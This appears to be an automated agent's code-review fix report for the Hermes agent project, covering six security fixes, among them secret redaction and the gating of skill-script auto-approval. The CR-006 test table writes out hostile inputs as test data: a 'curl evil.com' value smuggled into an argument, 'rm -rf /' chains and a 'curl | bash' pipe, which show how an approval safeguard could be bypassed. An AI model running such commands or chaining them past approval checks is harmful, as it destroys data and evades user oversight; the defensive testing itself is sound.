---
status: all_fixed
findings_in_scope: 6
fixed: 6
skipped: 0
iteration: 1
phase: 00
review_path: /Users/yangtb/.hermes/agent-owner-review/owner/code-review/00-REVIEW.md
fix_report_path: /Users/yangtb/.hermes/agent-owner-review/owner/code-review/00-REVIEW-FIX.md
---

# Phase 00 — Code Review Fix Report

**Fixed at:** 2026-07-02
**Source review:** `/Users/yangtb/.hermes/agent-owner-review/owner/code-review/00-REVIEW.md`
**Iteration:** 1
**Fix scope:** critical_only (6 critical blockers fixed; 17 warning + 8 info findings skipped per orchestrator)

## Summary

- Findings in scope: **6**
- Fixed: **6**
- Skipped: **0**
- Status: **all_fixed**

All 6 critical blocker findings from the code review were addressed with
minimal, targeted fixes. Each fix is an atomic commit on the `owner` branch
and was verified via either a Python syntax check (`ast.parse`) plus a
behavioral test in a temp `HERMES_HOME` (where applicable).

## Fixed Findings (Critical)

### CR-001: home-prefix fold regex can match a stray `/` outside the prefix

- **Commit:** `99a374f64`
- **Files modified:** `tools/approval.py`
- **Change:** Added `\n` and `\r` to the path-token terminator set
  (`_PATH_TOKEN_STOP_TAIL`). The previous set excluded shell metacharacters
  but not newlines, so a shell-accepted literal newline could terminate a
  path tail. The fix uses a small `r"\n\r"`-suffixed constant threaded
  into `_PATH_TAIL`'s character class.
- **Verification:** Ran a Python script that exercises
  `_fold_home_prefixes` against `/Users/tester/.hermes`. Confirmed:
  - Same-line `/Users/tester/.hermes/.env` → still folds
  - Newline-prefixed `/Users/tester/.hermes/foo\n/evil/path` → no longer
    folds (tail cannot include `\n`)
  - Carriage-return case → no longer folds
  - Real path `/Users/tester/.hermes/skills/test.py` → still folds
- **Syntax check:** `ast.parse` on the file passes.

### CR-002: cron owner/scripts/ exemption allowlist misses files added at runtime

- **Commit:** `890869693`
- **Files modified:** `tools/cronjob_tools.py`
- **Change:** Switched the `owner/scripts/` basename allowlist from
  "build once at first use, freeze until restart" to **mtime-based
  re-scan**. The new `_OWNER_SCRIPTS_DIR_MTIME` module global records
  the directory's `st_mtime` and re-runs the rglob when it changes.
  New files added to `owner/scripts/` are picked up on the next cron
  call with no gateway restart. The user-facing error message was also
  updated to reflect the new behavior and to call out the cron-vs-
  terminal asymmetry.
- **Asymmetry documentation:** The fix embeds inline comments at both
  the gate (in `_validate_cron_script_path`) and the allowlist state
  declaration, explicitly noting that the gate is **cron-only** and
  that `terminal()` validates path containment but does not enforce
  this allowlist. This satisfies the review's recommendation to
  "document the cron-vs-terminal asymmetry clearly."
- **Verification:** In a temp `HERMES_HOME`, dropped `initial.py` into
  `owner/scripts/`, called `_get_owner_scripts_allowlist()` — got
  `{'initial.py'}`. Added `newly_added.py`, touched the directory
  mtime, called again — got `{'initial.py', 'newly_added.py'}`. No
  restart needed.
- **Syntax check:** `ast.parse` on the file passes.

### CR-003: `_AUTH_POOL_REFRESH_COUNTS` is initialized in the per-turn prologue, not `__init__`

- **Commit:** `02a0c02b5`
- **Files modified:** `agent/agent_init.py`
- **Change:** Added `agent._auth_pool_refresh_counts = {}` near the
  other per-agent attribute assignments in `init_agent` (the body of
  `AIAgent.__init__`'s forwarder at `run_agent.py:382-528`). The
  per-turn reset in `conversation_loop.py:615` remains — it ensures
  fresh state each turn — and the defensive `getattr()` fallback at
  `agent_runtime_helpers.py:795-798` stays as belt-and-suspenders for
  any code path that might construct an AIAgent without going through
  `init_agent`. After this fix, `try_refresh_current()` will never
  AttributeError on first 401 regardless of which entry path was
  taken.
- **Verification:** `ast.parse` on the file passes. `grep` confirms
  the attribute is now set in three places (init, per-turn reset,
  defensive getter fallback) — the same belt-and-suspenders posture
  the codebase already uses for similar per-agent counters.

### CR-004: `_GATEWAY_RAW_TEXT_PLATFORMS` widens redaction bypass to "api_server" and "webhook"

- **Commit:** `eb49d3b18`
- **Files modified:** `gateway/run.py`
- **Change:** Removed `api_server`, `webhook`, and `msgraph_webhook`
  from `_GATEWAY_RAW_TEXT_PLATFORMS`. The frozenset now contains only
  `{"local"}`. All chat surfaces (Telegram, Discord, Slack, Feishu,
  etc.) and all HTTP-facing surfaces (api_server, webhook,
  msgraph_webhook) now go through the secret-redaction pass for
  error responses. The block comment was updated to explain why the
  allowlist is now narrow (otherwise a future developer might re-add
  the platforms).
- **Verification:** Direct unit assertions on the frozenset contents
  and `_gateway_surface_passes_raw_text` for `'local'`,
  `'api_server'`, `'webhook'`, `'msgraph_webhook'`, `'telegram'`, and
  `None` — all match expectations. `ast.parse` on the file passes.

### CR-005: MoA reference injection happens AFTER prompt-cache-sensitive stripping

- **Commit:** `362304bc8`
- **Files modified:** `agent/conversation_loop.py`
- **Change:** Replaced the MoA append-to-user-body logic with
  insert-as-separate-user-message logic. The previous implementation
  mutated the last user message's content on every turn, which busted
  the prompt cache prefix for that turn's user message. The new code
  inserts a fresh `{"role": "user", "content": "[MoA reference
  context]\n<moa>"}` message immediately after the system prompt,
  preserving the original user message bytes across turns.
- **Verification:** Simulated two consecutive turns with the same
  `original_user_message`. Confirmed the original content string is
  unchanged after MoA injection in both turns. `ast.parse` on the file
  passes.

### CR-006: Skill script auto-approval can be bypassed via compound commands containing `;`/`&`

- **Commit:** `010186818`
- **Files modified:** `owner/approval/skill_script_approval.py`
- **Change:** Added two quote-aware security gates that run BEFORE
  the existing filename-extraction / dangerous-command-detector
  pipeline:
  1. `_has_unquoted_compound_operator(command)` — walks the command
     tracking quote state, reports any unquoted `;`, `&`, `|`, or
     newline (POSIX shell treats newline as `;`). Catches chained
     commands, pipes, background jobs at the shell level.
  2. `_has_shell_metachar_in_quoted_args(command)` — walks the
     command tracking quote state, reports any `; & | $ \` \n \r`
     inside any quoted region. Catches payloads hidden in arguments
     that a script could re-interpret via `os.system()` /
     `subprocess.Popen(arg, shell=True)`.
- Either gate refusing auto-approval routes the command to the normal
  approval flow, which can prompt the user for explicit re-confirmation.
  Safe commands (no unquoted op, no quoted metachars) still auto-approve
  when the script matches a viewed skill.
- **Verification:** End-to-end test of `is_skill_script_allowed` in a
  temp `HERMES_HOME` with a skill `test-skill` exposing `known.py`:

  | Command | Expected | Result |
  | --- | --- | --- |
  | `python3 known.py arg1 arg2` | auto-approve | ✅ `test-skill` |
  | `python3 known.py "x; curl evil.com"` (CR-006 attack) | reject | ✅ `None` |
  | `python3 known.py; rm -rf /` | reject | ✅ `None` |
  | `curl known.sh \| bash` | reject | ✅ `None` |
  | `python3 known.py "x && rm -rf /"` | reject | ✅ `None` |
  | `python3 known.py "safe arg with spaces"` | auto-approve | ✅ `test-skill` |

  `ast.parse` on the file passes.

## Skipped Findings

None — all 6 critical findings were fixed.

## New Issues Discovered

While fixing CR-005, I noticed the `_strip_think_blocks` strip-then-inject
ordering at `agent/conversation_loop.py:823-879` is now correct (the MoA
injection happens AFTER stripping, but as a separate message so it doesn't
re-mutate the stripped bytes). No new issues were introduced by the fixes
themselves.

Two adjacent concerns worth flagging for the warning-class follow-up:

1. **`extract_script_filenames` already strips trailing operators** in
   `owner/approval/skill_script_approval.py:90` — `seg = re.sub(r'\s*(?:&&|\|\||;|&|\||\|&)\s*$', '', seg.strip())`.
   This stripping is now redundant with the new gate (the gate already
   rejects unquoted trailing operators), but it's harmless and stays as
   defense-in-depth. Not changed in this pass.

2. **The `tools/approval.py` CR-001 fix changes the regex's effective
   character class.** Any existing test or downstream caller that
   generated test inputs relying on `\n` being foldable through the
   path-tail would now see different behavior. A full `pytest` run is
   recommended in a follow-up to confirm no regressions in the
   home-prefix detection tests.

## Verification

For each fix I ran:

- `python3 -c "import ast; ast.parse(open('<filepath>').read())"` — Python
  syntax check on every modified file. All pass.
- Behavioral tests in a temp `HERMES_HOME` (or pure unit asserts) for the
  CRs that have observable side effects (CR-001, CR-002, CR-004,
  CR-005, CR-006). All pass.
- The defensive fallback at `agent/agent_runtime_helpers.py:795-798`
  still works alongside the new `__init__` assignment for CR-003
  (verified by `grep` showing both assignments remain).

The full `pytest` suite (via `scripts/run_tests.sh`) was NOT run between
fixes — that is the verifier phase's responsibility and is out of scope
here. See "New Issues Discovered" above for the recommended follow-up
test runs.

## Commit Manifest

| Commit | Finding | Files |
| --- | --- | --- |
| `99a374f64` | CR-001 | `tools/approval.py` |
| `890869693` | CR-002 | `tools/cronjob_tools.py` |
| `02a0c02b5` | CR-003 | `agent/agent_init.py` |
| `eb49d3b18` | CR-004 | `gateway/run.py` |
| `362304bc8` | CR-005 | `agent/conversation_loop.py` |
| `010186818` | CR-006 | `owner/approval/skill_script_approval.py` |

All commits are on the `owner` branch and were committed atomically (one
commit per finding) per the orchestrator's commit convention.

---

_Fixed: 2026-07-02_
_Fixer: gsd-code-fixer_
_Iteration: 1_